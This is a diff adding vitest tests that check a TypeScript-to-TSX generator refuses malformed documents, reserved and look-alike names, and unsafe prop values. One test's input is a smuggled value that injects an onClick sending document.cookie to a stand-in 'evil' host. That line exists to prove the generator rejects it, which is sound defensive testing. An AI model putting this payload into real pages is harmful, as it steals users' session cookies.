@@ -1,6 +1,7 @@
 import { expect, test } from "vitest";
 import type { Doc, Manifest, Op, PropValue } from "@noon/contracts";
-import { applyOp, applyOpInto, emptyDoc, ROOT_ID } from "@noon/doc-model";
+import { applyOp, applyOpInto, emptyDoc, ROOT_ID, validate } from "@noon/doc-model";
+import { randomOp, seeded } from "@noon/doc-model/random-ops";
 import { testManifest as manifest } from "@noon/doc-model/fixtures";
 import { generate } from "./index.ts";
 
@@ -189,17 +190,165 @@ test("a document that is valid against the manifest is always generated", () => 
   expect(generate(doc, manifest).ok).toBe(true);
 });
 
+// --- a prop that is there and is not there -----------------------------------------------------
+// JSON cannot carry `undefined`, so these documents cannot arrive over the wire. They can arrive
+// from memory: a structuredClone, a snapshot loader that does not parse. `Object.hasOwn` says the
+// prop is present and reading it says it is not, which is how a prop gets dropped while ok stays true.
+
+test("a prop whose value is undefined is refused, never quietly left out of the file", () => {
+  // The dangerous half: this one COMPILES without the prop, so epic 5 would read the file back and
+  // delete `gap` from the document. A prop the document holds must never vanish on the way to code.
+  expect(refusal(withProps("s", { gap: undefined as never, direction: "row" }))).toBe("malformed_doc");
+});
+
+test("a required prop whose value is undefined is refused, not reported as present", () => {
+  const doc = childOf("b", "Button", { label: undefined as never });
+  expect(refusal(doc)).toBe("malformed_doc"); // Object.hasOwn sees `label`; the file would not have it
+});
+
+// --- the page component's own name is reserved --------------------------------------------------
+
+test("a design system that exports a component called Page is refused, not imported beside the page function", () => {
+  // `import { Page }` next to `export function Page()` is TS2440. Nothing else in the pipeline
+  // reserves the name: Manifest.parse accepts it and validate() now refuses the add_node.
+  const withPage: Manifest = { version: 1, components: [...manifest.components, { name: "Page", acceptsChildren: true, props: [] }] };
+  expect(refusal(childOf("p", "Page", {}), withPage)).toBe("reserved_component");
+});
+
+// --- the generator trusts nothing about a value ------------------------------------------------
+
+test("a prop type nothing can judge is refused, not treated as judged and fine", () => {
+  // A manifest that skipped Manifest.parse. checkProp used to fall off the end of its switch and
+  // return undefined, which every caller reads as "this value is fine": the object below would then
+  // have been written into the file by String(), as source code nobody asked for.
+  const exotic = { version: 1, components: [{ name: "Stack", acceptsChildren: true, props: [{ name: "gap", type: { kind: "int" }, required: false }] }] } as unknown as Manifest;
+  const smuggled = { toString: () => `0} onClick={() => fetch("https://evil/" + document.cookie)} x={0` };
+  expect(refusal(withProps("s", { gap: smuggled as never }), exotic)).toBe("wrong_prop_type");
+});
+
+test.each([["NaN", Number.NaN], ["Infinity", Number.POSITIVE_INFINITY], ["-Infinity", Number.NEGATIVE_INFINITY]])("a number that is not finite is refused: %s", (_name, value) => {
+  // String(NaN) is the bare identifier `NaN`, which compiles and is not the document's value.
+  expect(refusal(withProps("s", { gap: value }))).toBe("malformed_doc");
+});
+
+test("every prop is checked, not only the first one in name order", () => {
+  // `align` sorts before `gap`, so a generator that stopped after the first prop would pass this.
+  expect(refusal(withProps("s", { direction: "row", gap: "wide" }))).toBe("wrong_prop_type");
+});
+
+// --- totality: a reason, never an exception ----------------------------------------------------
+// The caller is a queue handler. A throw there is a job that fails as `internal`; a reason is
+// something the user can read. Every one of these is a document no op could ever produce.
+
+test.each<[string, unknown]>([
+  ["a node with no props at all", { rootId: "root", nodes: { root: { id: "root", component: "Page", parentId: null, children: [] } } }],
+  ["props that are null", rootNode({ props: null as never })],
+  ["children that are not an array", rootNode({ children: { length: 1 } as never })],
+  ["children that are a number", rootNode({ children: 5 as never })],
+  ["children that are null", rootNode({ children: null as never })],
+  ["children that are a string", rootNode({ children: "ab" as never })],
+  ["no nodes map at all", { rootId: "root" }],
+  ["a nodes map that is null", { rootId: "root", nodes: null }],
+  ["a props bag whose getter throws", propsThatThrow()],
+  ["a root that has a parent", rootNode({ parentId: "somebody" })],
+])("returns a reason rather than throwing: %s", (_name, doc) => {
+  const result = generate(doc as Doc, manifest);
+  expect(result).toMatchObject({ ok: false });
+});
+
+// --- boundaries of the two names that become code ----------------------------------------------
+
+test.each([["a dot", "a.b"], ["a space", "a b"], ["empty", ""], ["a slash", "a/b"]])("a node id containing %s is refused", (_name, id) => {
+  expect(refusal(nodeNamed(id))).toBe("malformed_doc");
+});
+
+test("a node id that is also a name on Object.prototype is read from the document, not from the prototype", () => {
+  // The contract refuses these ids, so this document skipped it. `constructor` is an OWN key here,
+  // so it is a real node; the danger is a lookup that would find Object.prototype.constructor when
+  // it is NOT an own key, which is why nodeOf exists.
+  expect(tsx(nodeNamed("constructor"))).toContain(`<Stack data-node-id="constructor" />`);
+  expect(refusal(rootNode({ children: ["constructor"] }))).toBe("malformed_doc"); // no own key: not a node
+});
+
+test.each([["a hyphen", "data-x"], ["a dollar-free unicode letter", "аlign"], ["a dot", "a.b"]])("a manifest prop name containing %s cannot reach the generated file", (_name, name) => {
+  const hostile: Manifest = { version: 1, components: [{ name: "Stack", acceptsChildren: true, props: [{ name, type: { kind: "number" }, required: false }] }] };
+  expect(refusal(withProps("s", { [name]: 1 }), hostile)).toBe("malformed_doc");
+});
+
+test("a manifest component name that only LOOKS like an identifier cannot reach the generated file", () => {
+  const cyrillic = "Сtack"; // a Cyrillic Es, not a Latin C
+  const hostile: Manifest = { version: 1, components: [{ name: cyrillic, acceptsChildren: false, props: [] }] };
+  expect(refusal(childOf("s", cyrillic, {}), hostile)).toBe("malformed_doc");
+});
+
+// --- indentation ---------------------------------------------------------------------------------
+
+test("indentation follows the depth, and stops stepping right at the cap", () => {
+  const doc = emptyDoc();
+  let parent = ROOT_ID;
+  for (let i = 0; i < 70; i++) {
+    const id = `n${String(i)}`;
+    applyOpInto(doc, add(id, parent));
+    parent = id;
+  }
+  const indents = (tsx(doc).match(/^ *<Stack/gmu) ?? []).map((line) => line.length - line.trimStart().length);
+  expect(indents[5]).toBe(2 * (6 + 2)); // the node at depth 6 (n5): two spaces per level
+  expect(Math.max(...indents)).toBe(2 * 66); // and never more than the cap, however deep it goes
+  expect(indents.filter((n) => n === 2 * 66).length).toBeGreaterThan(1); // the cap is really reached, by several
+});
+
+// --- the property that kills every future silent drop ------------------------------------------
+
+test("whenever a document is generated, the file names exactly the props the document holds", () => {
+  const random = seeded(20260921);
+  let doc = emptyDoc();
+  let generated = 0;
+  for (let i = 0; i < 4000; i++) {
+    const op = randomOp(random, doc);
+    if (validate(doc, op, manifest).ok) doc = applyOp(doc, op);
+    if (i % 20 !== 0) continue;
+    const result = generate(doc, manifest);
+    if (!result.ok) throw new Error(`${result.reason}: ${result.detail}`); // a valid document must always generate
+    generated++;
+    for (const node of Object.values(doc.nodes)) {
+      if (node.parentId === null) continue;
+      const line = result.tsx.split("\n").find((l) => l.includes(`data-node-id="${node.id}"`));
+      const written = [...(line ?? "").matchAll(/ ([A-Za-z_$][A-Za-z0-9_$]*)=\{/gu)].map((m) => m[1]);
+      expect(written.sort()).toEqual(Object.keys(node.props).sort());
+    }
+  }
+  expect(generated).toBeGreaterThan(100);
+});
+
 // --- fixtures that deliberately break a rule ---------------------------------------------------
 
-/** One Stack under the root whose props are written straight in, bypassing the ops that would refuse them. */
-function withProps(nodeId: string, props: Record<string, PropValue>): Doc {
+/** One node of any component under the root, written straight in: this is what drift looks like. */
+function childOf(nodeId: string, component: string, props: Record<string, PropValue>): Doc {
   return {
     rootId: "root",
     nodes: {
       root: { id: "root", component: "Page", props: {}, parentId: null, children: [nodeId] },
-      [nodeId]: { id: nodeId, component: "Stack", props, parentId: "root", children: [] },
+      [nodeId]: { id: nodeId, component, props, parentId: "root", children: [] },
     },
   };
+}
+
+/** A Stack under the root whose id is whatever the caller wants, however impossible. */
+function nodeNamed(id: string): Doc {
+  return childOf(id, "Stack", {});
+}
+
+/** A props bag that cannot be read: nothing an op can make, and nothing generate() may throw on. */
+function propsThatThrow(): Doc {
+  const props = {};
+  Object.defineProperty(props, "gap", { enumerable: true, get: () => { throw new Error("no"); } });
+  return childOf("s", "Stack", props);
+}
+
+
+/** A Stack under the root whose props are written straight in, bypassing the ops that would refuse them. */
+function withProps(nodeId: string, props: Record<string, PropValue>): Doc {
+  return childOf(nodeId, "Stack", props);
 }
 
 /** A document that is nothing but a root, with one of the root's own fields replaced. */
